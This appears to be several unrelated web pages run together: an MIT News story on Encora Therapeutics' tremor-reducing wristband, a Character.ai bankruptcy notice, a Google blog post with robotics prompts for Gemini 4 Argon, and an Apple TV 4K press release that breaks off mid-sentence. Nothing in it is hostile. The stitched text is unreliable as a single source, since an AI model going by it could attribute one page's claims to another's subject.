Credits : Credit: Courtesy of Encora Therapeutics Caption : Encora co-founders: (L to R) Alli Davanzo, Daniel Carballo, and Kyle Pina. Credits : Credit: Melanie Gonick, MIT Previous image Next image In 2017, a man named Michael walked onto stage in front of a packed Kresge Auditorium at MIT and attempted to draw a spiral, a common test doctors use to diagnose Parkinson’s disease. His tremors, caused by the disease, made the exercise difficult.  Then, Michael put on a wristband device made by a team of MIT students as part of 2.009 (Product Engineering Processes), who were presenting their prototype that evening. Michael pressed a button and the device produced a subtle vibration. The vibration sent signals up his wrist and into his brain. His tremors dramatically decreased, and within seconds he was able to draw the spiral with much more precision, to a roaring ovation from the audience. “When this device is turned on, I feel like I used to feel when I didn’t have Parkinson’s disease,” Michael told the crowd. “It’s an amazing, amazing feeling.” The performance was so impressive that the student team received requests from classmates and others asking where they could buy the device for family and friends living with tremors. Unfortunately, the students had to explain there was only one — for the time being. The event set off a near decade-long journey that began by leveraging MIT entrepreneurial resources like MIT Sandbox, MIT FUSE, and the MIT Venture Mentoring Service. In 2020, the student team turned into an official company, Encora Therapeutics. But there were still dozens of hardware iterations ahead. Then there were clinical trials. In one trial, 78 percent of patients reported benefits after 90 days of home use. This February, nine years after Michael’s brave demonstration, all that work finally paid off: The FDA cleared Encora’s device to help adults with essential tremor, a condition similar to Parkinson’s that causes shaking, often in the hands.  “It’s been a long and difficult — very difficult — journey, but also very rewarding, especially when we get feedback from patients,” says Daniel Carballo ’18, SM ’20, an Encora co-founder and vice president of strategy. “We hear stories from patients about how they’ve struggled with their condition and how much they benefit from this. It reminds us why we keep going.” From classroom to commercialization The three founders of Encora who are still with the company are Carballo, Allison Davanzo ’18, and Kyle Pina ’18. They were each seniors in 2017 when they enrolled in 2.009, MIT’s popular product-design class. The semester began with a brainstorming session in which groups of about 17 students were asked to come up with dozens of potential product ideas. Carballo proposed a wearable device that used mechanical vibration to send signals to the brain to reduce tremors. The initial idea was to help patients with Parkinson’s disease. “It was one of hundreds of throwaway ideas,” Carballo recalls. “The initial concept was inspired by classes I had taken in robotics around neural control of movement. I had a preliminary understanding of how an electromechanical device might interact with the body’s control systems and feedback loops that control movement to relieve pathological control of movement.” The team eventually whittled their long list of ideas down to a few. Carballo’s idea was finally selected by a vote of 16-1 — with Carballo the only dissenting vote. “I tried to explain to the team that this was so far-fetched that there was no way, in one semester, we would be able to make anything,” Carballo recalls. “Thankfully, I got outvoted.” Through most of the semester, Carballo’s pessimism looked justified. At every class milestone, the team lagged behind other teams. Then, the week before final presentations, they met Michael, whose severe hand tremors were the result of early-onset Parkinson’s. “He was a home renovator, so he worked with his hands, but his tremors had progressed to the point that he struggled to turn a screwdriver, use a drill, or even fill out paperwork,” Carballo recalls. “He had become reliant on his wife and daughter not only to run his business, but to help him with everyday activities.” By this point, the 2.009 team had a prototype that would vibrate to send mechanical feedback to the brain. Carballo described it as “a foamcore box with a Raspberry Pi chip and some wires coming out.” When Michael put on the device and turned it on, his tremors dramatically decreased. “It was like a light switch turned on and his tremors stopped,” Carballo says. “His wife and daughter started crying. A week later, he was gracious enough to repeat the process on stage for the final presentations.” The presentation — and the outpouring of interest from people who wanted it for loved ones with Parkinson’s — made the team determined. “It showed us there were a lot of people with this problem that could really benefit from this,” Carballo says. “A subset of the team became possessed. It would have been such a shame to know this could exist and to have it never leave the classroom.” Some team members began using MIT’s entrepreneurial resources to commercialize the technology, initially focusing on Parkinson’s. They ran their first clinical trial with 20 Parkinson’s patients in 2022 in collaboration with MassGeneral Brigham. But they soon learned more patients are living with essential tremor. “It was a greater unmet need,” Carballo says. “There are a lot of drugs being developed for Parkinson’s disease, but essential tremor hasn’t experienced that same innovation.” Today scientists think tremor is caused by malfunctioning signals in the regions of the brain responsible for interpreting sensory input and coordinating movement. “In these diseases, neurotransmitter deficiencies result in this pulsed signaling in the brain that manifests as tremors that are basically pulsed motor outputs,” Carballo says. One current approach to target those signals is surgery that involves drilling holes in the skull to insert electrodes that drive new electrical patterns in the brain. Encora’s watch-like product targets the same brain regions with mechanical vibrations at the wrist. “We’re applying mechanical stimulus, basically vibration, to stretch receptors in the wrist, which tell your body where it is in space,” Carballo explains. “The stimulation causes the receptors to activate and send a patterned signal to peripheral nerves of the wrist, that then carry the signal to the peripheral nervous system and into the central nervous system, to the same regions of the brain targeted by surgery.” In 2024, Encora ran a randomized control trial with 47 patients living with essential tremor. Last year, the team ran a 59-person trial where patients used the devices at home. In both trials, more than 70 percent of patients experienced meaningful improvement. The results were promising enough to gain what’s known as 510(k) clearance from the FDA for use as a medical device, in February of this year. Helping patients Most patients see rapid benefit when using Encora’s device. Patients have described the device as life-changing. Some say it allows them to do tasks they haven’t been able to do in years. “We see some patients using the device 12, 14 hours a day,” Carballo says. Today, Encora is focused on building a national sales force and working to secure coverage from insurers. As the company ramps up production, the product will finally become available for patients who qualify. Further down the line, Encora hopes to fulfill its original mission of helping mitigate tremors in patients with Parkinson’s. Carballo believes the approach also holds promise for many other patients. “There is a surprisingly long list of diseases that this could work for,” Carballo says.  “The most obvious are neurological movement disorders, but the bigger picture of wearable neuromodulation is a rapidly growing field that has seen therapeutic benefit across a broad range of diseases. We see this as a platform technology.” Share this news article on: X Facebook LinkedIn Reddit Print Related Links Encora Therapeutics Class 2.009 (Product Engineering Processes) Department of Mechanical Engineering School of Engineering Related Topics Startups Classes and programs Alumni/ae Medical devices Parkinson's Health care Disease Assistive technology Mechanical engineering Innovation and Entrepreneurship (I&E) School of Engineering Venture Mentoring Service Related Articles Startups take root in senior capstone class Three from MIT awarded 2022 Paul and Daisy Soros Fellowships for New Americans Previous item Next item More MIT News Suzy Nelson transformed student life at MIT Over the last decade, the vice chancellor has refocused the Institute’s approach to student life to center on student well-being. title: Character.ai has initiated voluntary Chapter 11 bankruptcy
body_text: An Update on Character.ai careers try c.ai --> Oct 12, 2026 2 min read An Update on Character.ai Today, we’re sharing that Character.ai has initiated a voluntary Chapter 11 bankruptcy process to facilitate a court-supervised sale of the company.  Over the past year, we’ve taken meaningful steps to sustain and improve our business amid significant legal, regulatory, and operational headwinds. After a comprehensive review of our available alternatives, our board determined that this court-supervised sale process provides us with the best opportunity to maximize value for all of our stakeholders.  We hope that the sale process will yield an actionable proposal that will allow continued operations of the Character.ai platform. If such a bid is unavailable, however, the platform will be wound down.  As we navigate this process, maintaining a safe and engaging experience for our community remains a top priority.  What This Means for Our Community The Character.ai platform remains up and running, and you can continue to access all services at this time.  We know that this news may raise questions for some of you. To learn more, please see our FAQs below. And if you need support, you can find helpful resources here . 1. Why did Character.ai file for Chapter 11? Over the past year, we have taken meaningful steps to sustain and improve our business amid significant legal, regulatory, and operational headwinds.    After a comprehensive review of available options, we determined the best path forward was to begin a Chapter 11 case to pursue a court-supervised sale of all or substantially all of our assets. We believe that this court-supervised process both maximizes the value of our business and provides the best opportunity for continued service to our platform users. 2. How long is the sale process expected to take? We currently expect that the court-supervised sale process will be complete by the end of November or perhaps early December 2026. 3. What does this mean for users?  The Character.ai platform remains up and running, and you can continue to access all services at this time. We're focused on finding the best path forward for our platform and community. 4. Is my paid subscription still active? Yes, your subscriptions remain active, and billing is unchanged for now. If the service changes in a way that affects paid features, we intend to notify subscribers in advance. 5. What happens to user data and chats? Your information continues to be protected under our Privacy Policy , and our data privacy and security practices are unchanged. As a reminder, you can delete your account or export your data through the app or the Character.ai website.  To learn more, you can read the full press release HERE . Court filings and additional information relating to Character.ai’s Chapter 11 case can be found HERE , a website administered by Character.ai’s claims and noticing agent, Stretto, Inc.  character.ai blog © 2026 Powered by Ghost

title: Gemini 4 Argon for Robotics
body_text: Gemini 4 Argon for Robotics - Google Developers Blog Community/Events Learn Blog YouTube Search Community/Events Learn Blog YouTube Gemini 4 Argon for Robotics OCT. 13, 2026 Kanishka Rao Principal Software Engineer Share Facebook Twitter LinkedIn Mail Gemini 4 Argon marks a step change in physical understanding, code generation, and visual-semantic reasoning—unlocking new workflows across the robotics stack and accelerating progress toward physical AGI. You can see this leap in capability on the Embodied Reasoning (ERQA) benchmark , which tests a model's ability to understand and solve physical, spatial problems in 3D environments. Using pure reasoning, Argon scores 87%, outperforming every other frontier model. As a general-purpose physical reasoning model, Argon can be applied across the entire robotics lifecycle. In this post, we share representative prompts for Argon across four key areas: Robot control → Mobile manipulation with MuJoCo practice, zero-shot robot control, and closed-loop steering of video world models. Real2Sim → Reconstructing physically calibrated simulation twins from robot camera feeds, egocentric human video, or hand-drawn paper sketches. Physical understanding → Agentic multimodal hindsight labeling including detailed understanding of dexterity, dense value functions and progress estimation. Research and self-improvement → Action improvement via simulation and iterative self-improvement on hardware. Unlocking robot control with Argon 1. Spot mobile manipulation: Putting in the trash bin with MuJoCo practice Argon controls a Boston Dynamics Spot® quadruped (12-DoF legs + 6-DoF arm) to learn a new skill: stepping on a foot-pedal trash bin to throw away soda cans. Argon creates an articulated MuJoCo digital twin of a foot-pedal trash bin to practice its moves before stepping on the physical pedal and dropping soda cans into the open bin. Sorry, your browser doesn't support playback for this video Spot Mobile Manipulation — Real-to-Sim-to-Real foot-pedal trash bin disposal: Spot picking up the soda can, checking its wrist camera, practicing 3-leg tripod balance in MuJoCo, stepping on the foot pedal, verifying hand centering in the open bin, and dropping the can inside. Prompt: There's a Diet Coke can behind you and another on the black table on your left. Use the spot-mobile-manipulation skill to pick them up and trash them in the black foot-pedal bin. Before stepping down on the pedal, verify in the front cameras that your front-right foot target is centered on the pedal, and use a 2-agent verification swarm (foot-verifier and hand-verifier) to verify both the foot-pedal step and the 3D hand-in-bin alignment before releasing. Plain text Copied 2. Zero-shot control Argon controls a simple robotic arm to place a fallen mug upright and put the crumpled napkin inside. Argon reasons with a visual coordinate harness and action primitives to perform this task over several turns. Sorry, your browser doesn't support playback for this video Left: 3rd-person real robot view; Right: calibrated wrist camera with projected 2 cm world coordinates and jaw-closing reticle. Prompt: [Attached: wrist_cam.png, obs.json] Task: Get the robot arm to reorient the mug upright and put the napkin inside the mug. ## Execution Discipline - Simply output 1 sentence observation followed immediately by your `curl` command (with `# Plan:` on Turn 1 and `# Thought:` on every turn). Everything needed is in `obs.json` and the calibrated reticle/grid drawn on `wrist_cam.png`. ## Visual Coordinate Reference (Annotated on wrist_cam.png) - `+X` (UP in image): Away from robot base | `-X` (DOWN): Towards robot base - `+Y` (LEFT in image): World left | `-Y` (RIGHT): World right - `+Z`: Height above table | `Yellow numbers`: World (X, Y) in centimetres (2 cm grid at `grid_z`) - `Cyan + crosshair`: Current 3D pinch center - `Cyan [ + ] brackets`: Current jaw opening and closing line - `Green line`: Current object long-axis orientation (`yaw_deg`: 0° = vertical along +X, 90° = horizontal along +Y) - `pitch_deg = 90°`: Straight down (-Z) top-down grasp/place; `pitch_deg < 60°`: Tilted coaxial approach along finger axis ## Closed-Loop Turn Workflow 1. Inspect current state & view `wrist_cam.png`: `curl -s http://127.0.0.1:8081/obs` (returns `ee_pos`, `holding`, `status`, `workspace`, `wrist_cam_path`). 2. Select VLM call granularity upfront on Turn 1: - Coarse (2–4 calls): `look_at` -> `grasp` -> `place` -> `done` - Pre-Grasp Hover Verify (4–7 calls): `look_at` -> `goto(z=0.04)` (verify cyan `[ + ]` brackets straddle target) -> `grasp` -> `place_until_contact` -> `done` - Fine Visual Servoing (8–20 calls): `look_at` -> `grasp` -> pre-pose `goto` -> closed-loop `move_by` / `move_until_contact` -> `done` 3. Send motion primitives (`POST /plan`) and verify visually after every turn in the updated `wrist_cam.png`. If `status == "grasp_failed"`, call `robot.look_at(...)` to re-observe and recover closed-loop. ## Code-as-Policies Primitives (`POST http://127.0.0.1:8081/plan`) robot.look_at(x=0.35, y=0.13, z=0.14, grid_z=0.015) x, y = robot.deproject(u=0.52, v=0.48, z_plane=0.015) robot.grasp(x=x, y=y, z=0.015, yaw_deg=-35, pitch_deg=90) robot.place(x=0.24, y=0.06, z=0.075) robot.place_until_contact(x=0.24, y=0.06, z=0.015, max_lag=0.012, relief=0.002) robot.goto(x=0.28, y=0.05, z=0.04, arc_z=0.14, pitch_deg=25, azimuth_deg=90, roll_deg=0, speed=0.10) robot.move_by(forward=0.025, dz=-0.002, dpitch_deg=-3, droll_deg=5, speed=0.04) robot.move_until_contact(dz=-0.06, speed=0.03, max_lag=0.012, relief=0.002) robot.open_gripper() / robot.close_gripper() / robot.home() / robot.done() Plain text Copied 3. Omni control Argon steers robots in the Gemini Omni World Model to rearrange five scattered Scrabble tiles ( G, R, A, N, O ) into a clean row spelling A - R - G - O - N . Instead of specifying one static prompt, Argon steers in a closed visual loop. It writes timestamped action prompts, inspecting intermediate rollout keyframes, and refining its prompts. Sorry, your browser doesn't support playback for this video Iterative Video World Model Steering Dexterous Hands: 33-Step Steered Video Rollout Spelling A-R-G-O-N. Prompt: Goal: {task_goal} You are steering a video world model (Gemini Omni) in an iterative visual feedback loop. Inspect the attached frames from the latest rollout and write the next timestamped action prompt for the video world model: - Break complex motions into one simple, single-direction action at a time. - Keep inactive hands retracted and avoid blocking the camera's view of objects in the workspace. - Explicitly state which areas of the workspace become empty after an object moves. - Use [MM:SS.mmm] timestamps for each action beat and wrap your output in <omni_prompt> tags. Example format (sample timestamps only, not the full prompt): <omni_prompt> [00:00.000] Character A's left hand rests at the side while the right hand reaches toward the target object. [00:02.500] Character A's right fingertips push the object smoothly into the center of the table, leaving its starting area empty. [00:05.000] Character A's right hand opens and retracts to the side so all placed objects remain in clear view of the camera. </omni_prompt> Plain text Copied Unlocking Real2Sim with Argon 1. Robot view to simulation Argon views a real robot teleoperation episode and develops a digital twin; it obtains or creates simulation assets that look and behave like the real objects upon contact with the dexterous hands. Argon tunes the assets and scenes to match sim visuals and contact events with those in the real recorded data in an iterative visual-reasoning loop. Sorry, your browser doesn't support playback for this video Left (Real View): synchronized real robot camera feeds; Right (Simulated): 3D MuJoCo scene reconstructed and calibrated by Argon. Prompt: [Attached: robot_rollout_episode] Build a MuJoCo scene of the robot and reconstructed task objects. When each episode is replayed frame by frame, by driving the robot joints toward the logged observation.state with joint-space PD. Iterate using two verification objectives: (1) Visual match: MuJoCo renders from the head_left, left_wrist, and right_wrist cameras line up with, and look like, those real observations. (2) Physical match: the simulated contact force/torque on each Sharpa fingertip, in the sensor frame, matches the logged tactile_force in timing, magnitude and direction. What you can tune happens before simulation starts: (1) Static object assets: realistic geometry, collision shapes, mass, inertia, friction and joints, with appearance close to the real objects, plus the initial object poses at t = 0. (2) Offline-planned robot commands, changed only in frames where the real fingertips are near an object. Each command must stay within 0.55 rad (arm joints) and 0.65 rad (hand joints) of the logged teleop trajectory. Everywhere else, replay the logged trajectory unchanged. No sim cheating: task objects may move only through real MuJoCo contact with the robot hands and the environment (mj_step). Not allowed after t = 0: changing MjModel parameters; applying external forces or torques to objects; welds or equality constraints; feedforward torques beyond joint-space PD; setting or rolling back object qpos/qvel; disabling or excluding collisions; reporting contact forces that don't come from the MuJoCo solver (for example, copying the logged tactile readings). Immediately present the reconstructed scene and rollout results as an interactive HTML session viewer with one page per episode, showing: - At the bottom: A synced timeline (play, scrub, speed control) that drives every panel. - On the left panel: An interactive 3D Blender scene showing the simulated robot and objects, showing contact points and force arrows as replay progresses. - On the right panel: Real vs. sim camera views side by side for all 3 cameras. Real vs. sim finger force visualizations. Plain text Copied 2. Human view to simulation Given an egocentric human video of a manipulation task, Argon identifies the task-relevant objects, replaces crude bounding boxes with compound convex-decomposed meshes for concave containers, and retargets the human hand trajectory onto a 76-DoF bimanual humanoid with 22-DoF five-fingered hands in MuJoCo contact physics. Sorry, your browser doesn't support playback for this video Human View to Simulation — Egocentric Human Video to Dexterous Humanoid Twin: Left shows the input egocentric human RGB video; Right shows the synchronized 500 Hz MuJoCo + Blender Cycles multi-view simulation rollout. Prompt: [Attached: egocentric_human_video.mp4, candidate_sim_views.png, hand_3d_keypoints.json] You are building a physically solvable 500 Hz MuJoCo manipulation environment (`scene.xml`) and studio Blender render that faithfully reproduces the tabletop task shown in `egocentric_human_video.mp4` on a bimanual humanoid robot with 22-DoF dexterous five-fingered hands: 1. Scene Reconstruction & Camera Calibration: - Identify only the manipulation-relevant objects (the grasped target object and the receiving container or landmark) and triangulate their 3D tabletop coordinates from the egocentric camera intrinsics/extrinsics. - Replace crude bounding boxes with compound convex-decomposed 3D meshes so concave containers (nested bowls, recessed wooden trays, open bins) support physical interior placement. 2. 500 Hz Dexterous Motion-Fitting Stress Test: - Retarget the 3D human wrist and finger keypoints to the humanoid's 7-DoF arm and 22-DoF hand joints, and step the trajectory in MuJoCo at 500 Hz (dt = 0.002s) with zero kinematic weld constraints. - Verify opposing thumb-and-finger force closure, clean object lift (> 2 cm), and stable final placement inside or beside the target landmark. Plain text Copied 3. Sketch to simulation With Argon, a developer can snap a photo of a rough pen-and-paper sketch—showing an Apollo 2 humanoid throwing a ball along a parabolic arc to topple a 3-2-1 stack of boxes on a table—and have Argon automatically construct the GPU-accelerated mujoco_warp scene, synthesize a balanced 76-DoF whole-body and five-finger throw trajectory, verify 6/6 target knockdown in closed-loop physics, and export a Blender 4.5 Cycles render. Sorry, your browser doesn't support playback for this video Sketch to Simulation — Hand-Drawn Sketch to Dexterous Humanoid Trajectory & Cycles Render. Prompt: [Attached: hand_drawn_throw_sketch.jpg] Translate this hand-drawn sketch into a physically verified humanoid simulation in `mujoco_warp` and a raytraced Blender Cycles video: 1. Scene & Kinematic Setup from Sketch: - Parse the spatial layout from `hand_drawn_throw_sketch.jpg`: place the 76-DoF humanoid (32-DoF body equipped with two 22-DoF five-finger dexterous hands) at the origin facing a table holding a 3-2-1 pyramid of 6 rigid target boxes, with a projectile sphere grasped in the right five-finger hand. 2. Whole-Body Balance & Dexterous Throw Synthesis: - Synthesize a 50 Hz whole-body throwing trajectory (140 steps, 2.80 s) across four phases: (1) stable stance & 5-finger power grasp closure, (2) torso/shoulder wind-up with ankle-hip Center-of-Mass compensation, (3) forward whipping acceleration, and (4) synchronized 22-DoF five-finger opening at peak hand velocity so the ball launches on a ballistic arc into the pyramid's second-tier center of mass. - Verify in `mujoco_warp` contact physics that the humanoid maintains upright balance (< 3 cm pelvis drift) and knocks down all 6 target boxes. Plain text Copied Unlocking physical understanding with Argon 1. Hindsight labeling and data quality Argon has precise physical understanding of dexterous manipulation and can provide detailed segmentation and text labeling from video. Argon is able to identify poor manipulation segments such as pauses, unstable grasps and fumbles. Given an overhead video of a bimanual ALOHA 2 robot folding a square sheet of paper into an origami fox over 136 seconds, Argon produces a time-aligned 4-level hindsight annotation hierarchy: Episode Goal (G1), 6 contiguous Semantic Subtasks (G2), 17 contact-level Atomic Primitives (G3), and automated Quality Control (QC) reweighting that holds task progress flat during fumbles and retries. Sorry, your browser doesn't support playback for this video Argon Multi-Granularity Hindsight & Telemetry HUD. Prompt: [Attached: Aloha2_Origami_20250309.mp4] Produce a time-aligned multi-granularity hindsight annotation JSON with four levels: 1. G1_episode_instruction: Concise imperative sentence describing the overall manipulation goal. 2. G2_subtasks: Contiguous semantic subtask phases specifying which arm(s) anchor vs. fold/rotate the object. 3. G3_atomic_primitives: Fine-grained contact-level primitives (3–15s) aligned with grasp closure, crease sweeps, release, or retry attempts. 4. quality_control_and_reweighting: Hold task_progress_pct flat during non-progressing slip/delamination retry loops and downweight them (0.15x–0.25x) for Behavior Cloning. Plain text Copied 2. Find the odd ball To recreate the classic 12-ball balance scale puzzle with robots, Argon builds a bimanual Franka FR3 MuJoCo environment with 12 visually identical pool balls (one secretly heavier or lighter) and an articulated Roberval two-pan balance scale. It then writes a vision-only closed-loop solver that triangulates the balls from stereo RGB cameras, visually reads the scale tilt after each weighing, and isolates the odd ball into the Heavy (Red) or Light (Blue) tray within 3 weighings. Sorry, your browser doesn't support playback for this video Find the Odd Ball (Vision-Only Closed-Loop Solver): Dual-arm Franka FR3 weighing candidate balls on the Gold/Teal pans, reading stereo scale tilt , and isolating the confirmed Heavy odd ball into the Red tray in 3 weighings. Prompt: # Prompt 1 — Physics-Accurate MuJoCo Environment & Benchmark Generation Make a MuJoCo environment where a dual-arm robot (two 7-DoF Franka FR3 arms with parallel-jaw grippers on a shared tabletop) is tasked to solve the classic 12-ball balance scale weight puzzle from https://www.mathsisfun.com/pool_balls_solution.html. 1. Create 12 visually indistinguishable pool balls in a 2x6 starting rack (11 standard 150 g, 1 odd ball either 270 g or 30 g). 2. Build a functional two-pan Roberval balance scale at the center of the table with parallelogram equality constraints (`mjEQ_JOINT`) so the Left (Gold) and Right (Teal) pans stay horizontal, plus Red (Heavy) and Blue (Light) submission trays. 3. Track distinct settled weighings (`weighing_count`) and reward `1.00` for isolating the true odd ball in the correct Heavy/Light tray within <= 3 weighings. # Prompt 2 — Closed-Loop Vision-Only Solver Implement an independent closed-loop policy relying strictly on stereo RGB camera inputs (`head_camera_left_rgb_image`, `head_camera_right_rgb_image`) and robot proprioception (`add_privileged_task_observations=False`): 1. Segment the 12 balls, Gold/Teal pans, and Red/Blue trays in both stereo views and triangulate their 3D coordinates. 2. Visually read the balance scale tilt after each weighing from stereo vertical pixel disparity (+1 = left heavier, -1 = right heavier, 0 = balanced). 3. Rotate the gripper wrist yaw by 90 degrees when grasping/placing inside the narrow scale pans to clear the raised rims, and isolate the odd ball into the Red or Blue tray within <= 3 weighings. Plain text Copied 3. Value function Argon is a general value function for robotics tasks. Evaluated on a 60-second bimanual ring-sorting episode from a human UMI dataset, Argon iteratively inspects synchronized head, left-gripper, and right-gripper camera feeds around contact transitions to generate dense value function / task progress predictions and decompose the trajectory into 28 segments with positive, neutral, and negative progress slopes. Sorry, your browser doesn't support playback for this video Value Function: Synchronized 3-camera UMI playback (head, left gripper, right gripper) locked to animated task progress curve and bimanual segment annotations. Prompt: [Attached: umi_head.mp4, umi_left_gripper.mp4, umi_right_gripper.mp4] Look at 3 videos of human wearing a gripper performing activities from head, left, right gripper views. Look at the videos thoroughly and give a detailed plot of progress at the task (with positive, neutral, negative slope), identifying important segments in the video and labeling the activities. Look at individual frames or subsegments of the video if necessary to get a better understanding. Plain text Copied Unlocking research and self-improvement with Argon 1. Action improvement via simulation Argon can generate new data in simulation to improve performance of generalist vision-language-action (VLA) models. Starting from a single RGB photo of the real tabletop, Argon autonomously builds a calibrated MuJoCo simulation twin, defines new tasks, and synthesizes a closed-loop motion generator to collect 4,500+ domain-randomized episodes in simulation—boosting real-world physical robot Success Rate from 56% to 75% and reducing completion time from 35s to 24s . Sorry, your browser doesn't support playback for this video Action Improvement via Simulation: improves the real-world evaluation benchmark (56% → 75% Success Rate and 35s → 24s Completion Time). Prompt: [Attached: real_tabletop_photo.jpg] You are given a single overhead RGB camera photo (`real_tabletop_photo.jpg`) of a bimanual robot workspace (two 7-DoF Franka FR3 arms with parallel-jaw grippers and 4 RGB cameras) facing a table arranged with photobooth party props. 1. Reconstruct procedural 3D meshes and compound MuJoCo collision primitives for all 9 party props matching their real-world dimensions, colors, and resting poses, including spring-hinged deformable crown panels for the soft plush cap. 2. Define a 77-task single-arm and bimanual curriculum (pick-and-place, uprighting, directional pushing, mid-air handovers, bimanual scoop-and-push, and pipelined table clearing). 3. Synthesize a closed-loop IK trajectory generator across ±10 cm pose randomization, verify `reward == 1.0` in MuJoCo physics, and export 4,500+ episodes for VLA fine-tuning. Plain text Copied 2. Self-Improvement for visual pick and place On a simple 6-DoF arm, Argon iteratively self-improves both execution speed and placement accuracy on a pick and place task via trial and self-reflection. Sorry, your browser doesn't support playback for this video SO-101 Vision-Guided Pick-and-Place — Iterative Hardware Self-Improvement Across Iterations 1 → 2 → 3: Iteration 1 (58.9s), Iteration 2 (22.9s, grazed box rim on drop), and Iteration 3 (17.4s, dead-center drop). Prompt: # Stage 1 — Measure Objects & Dry-Run Plan (No Hardware Motion) Stage 1: measure objects — find the objects and plan the whole motion. The arm does not move in this stage. A. I put a LEGO brick and a box on the table in front of the arm, and the wooden box to one side. Find the brick and the wooden box in the image. And also in the real world. Show this in an annotated image. B. A dry-run plan (no hardware). Write the planner to pick and place the lego block. Print the plan table, draw all poses onto the overhead image, and stop. Do not move the robot. Report with evidence. # Stage 2 — Pre-Pick Hover & Wrist-Camera Verification Stage 2: Put the gripper above the brick without touching it, and verify with the wrist camera that the arm and the vision agree. Please record executions with both cameras (compressed video is OK). # Stage 3 (Autonomous Pick-and-Place → Self-Improvement → Optimization): 1. Execute autonomously: Turn the Stage 1 dry run into a real grasp, lift, and place into the wooden box. Run it yourself subject to safety rules from AGENTS.md. 2. Self-improve: When an attempt fails, diagnose it yourself. Review your own logs and wrist/overhead footage, find the root cause, check the fix in a dry run, and retry. 3. Optimize on feedback: Once it succeeds, make it at least 2× faster within safety limits (rule R5) unless I authorize more, or give feedback. Plain text Copied 3. One-prompt robotics paper reproductions in MuJoCo WebAssembly With a single prompt per paper, Argon reads a robotics control manuscript and any released checkpoints, ports the physics model and closed-loop controller (from 7-network hierarchical locomotion in DeepLoco and 50 Hz PPO actors in HUSKY to Web Worker iLQR in Whole-Body MPC ) into self-contained MuJoCo WebAssembly browser labs, and verifies them in headless Chromium. Sorry, your browser doesn't support playback for this video Five Landmark Legged & Humanoid Papers Running Live in Browser (MuJoCo WASM): Robotic Soccer OP3 1v1, DeepLoco, Massively Parallel Deep RL ANYmal C, Whole-Body MPC Go2, and HUSKY G1 Skateboarding (from 68 interactive browser sandboxes reproduced by Argon). Prompt: [Attached: paper.pdf, optional author_checkpoints/ or urdf_assets/] Reproduce the paper "<Paper Title & arXiv ID>" from scratch in MuJoCo WebAssembly and deploy a self-contained browser lab + visual essay: 1. Match the paper's exact physics timestep, actuator gains (kp/kv), torque limits, and kinematic constraints in MuJoCo XML, and run real neural inference or Web Worker iLQR in JavaScript at the paper's exact control rates. 2. Build `index.html` (Spatial UI simulator with camera presets, live telemetry plots, and disturbance injection) and `scrollytelling.html` (interactive visual essay). 3. Run a headless Chromium (Playwright) verification loop asserting 0 console errors and non-zero task progress over 300+ frames. Plain text Copied Advancing embodied intelligence with Argon Argon bridges coding, visual perception, physics simulation, and embodied robot control. By reasoning natively over multi-view video, 3D geometry, contact mechanics, and proprioceptive telemetry, Argon understands not just what objects are in a scene, but how they physically interact with agents to accomplish whole-body dexterous tasks. Gemini 4 Argon marks an important milestone accelerating the path toward physical AGI. By building this core intelligence, our goal is to enable robotics that can work alongside humans to solve complex challenges. Getting started You can start building with Gemini 4 Argon today across Google’s developer platforms: Google AI Studio : Available to Google AI Ultra subscribers. Gemini API: Available with the paid tier of the Gemini API in AI Studio. Use gemini-4-argon in the Interactions API with day-one support across the google-genai SDKs. Google Antigravity: Available for Google AI Ultra subscribers. title: New Apple TV 4K
body_text: Apple unveils the new Apple TV 4K, supercharged by Siri AI - Apple Apple Store Mac iPad iPhone Watch Vision AirPods TV & Home Entertainment Accessories Support 0 + Newsroom Open Newsroom navigation Close Newsroom navigation Apple Services Apple Stories Search Newsroom Close opens in new window PRESS RELEASE October 13, 2026 Apple unveils the new Apple TV 4K, supercharged by Siri AI A more capable and conversational Siri, faster performance, and an even more immersive home theater setup elevate the entertainment experience The new Apple TV 4K features Siri AI, which transforms how users search for, discover, and enjoy their favorite movies and TV shows; faster performance; and an even more immersive home theater experience. CUPERTINO, CALIFORNIA Apple today announced the next generation of Apple TV 4K , delivering its most immersive home theater experience yet. The new Apple TV 4K features Siri AI, an entirely new version of Siri powered by the next generation of Apple Intelligence, transforming how users search for, discover, and enjoy their favorite movies and TV shows through a full-screen Siri AI experience. 1 With built-in far-field microphones, Apple TV 4K also lets users talk to Siri completely hands-free. 2 The new Apple TV 4K delivers even faster performance and, when paired with four HomePod mini 2 or HomePod (2nd generation) speakers, unlocks the most immersive home theater surround sound setup Apple has ever offered. As a home hub, Apple TV 4K also makes managing the smart home easier than ever, with Apple Intelligence-generated camera activity descriptions and summarized notifications in the Home app, and control of accessories and scenes. 3 The new Apple TV 4K can be pre-ordered starting today, with availability beginning November 13. “The new Apple TV 4K is our most immersive home theater experience yet,” said Bob Borchers, Apple’s vice president of Worldwide Product Marketing. “With Siri AI, finding something to watch becomes a full-screen, conversational experience, and with built-in far-field microphones, it’s completely hands-free. Pair it with HomePod for the best surround sound setup we’ve ever offered, and it makes managing your Apple Home accessories easier than ever. Now, alongside HomeView, HomePod mini 2, and Apple Home Collection, it’s part of the most connected Apple Home we’ve ever built.” An Entirely New Version of Siri Powered by Apple Intelligence Apple TV 4K brings Siri AI to the living room with a rich, full-screen experience. An entirely new version of Siri powered by the next generation of Apple Intelligence, Siri AI is a profoundly more capable and conversational assistant with personal context understanding, broad world knowledge, and the ability to take even more systemwide app actions, making it effortless to find entertainment. Users can simply ask Siri “What Apple TV shows won at the Emmy Awards this year?” and see beautiful poster art pulled directly from the Apple TV app, along with relevant suggestions like “More award-winning comedies” to keep exploring. While watching, users can ask Siri AI follow-up questions and tap into Siri AI’s broad world knowledge to go deeper into a show, asking things like “Where was Pluribus filmed?” or “Is this appropriate for a 15-year-old?” Responses appear in a compact, subtle overlay, providing helpful information when viewers ask while keeping them immersed in the action. With an Apple Intelligence-enabled iPhone, Siri AI on Apple TV 4K can now tap into a user’s personal context to answer requests like “Play the show Alinda recommended.” Siri AI is a profoundly more capable and conversational assistant with personal context understanding, broad world knowledge, and the ability to take even more systemwide app actions, making it effortless to find entertainment. A Fully Hands-Free Experience with Far-Field Microphones The new Apple TV 4K features three far-field microphones, letting users control what they’re watching and discover new shows completely hands-free. Advanced echo cancellation intelligently isolates a user’s voice from background sound to deliver crystal-clear “Hey Siri” or “Siri” recognition, even while audio is playing. Apple TV 4K now features three far-field microphones, letting users control what they’re watching and discover new shows completely hands-free. Faster Performance, Smarter Remote The A19 chip in the new Apple TV 4K delivers up to 50 percent faster CPU performance and up to 2x faster GPU performance than the previous generation, for greater responsiveness, faster navigation, and smoother animations. The A19 chip also includes a new, dedicated AV1 decoder, enabling 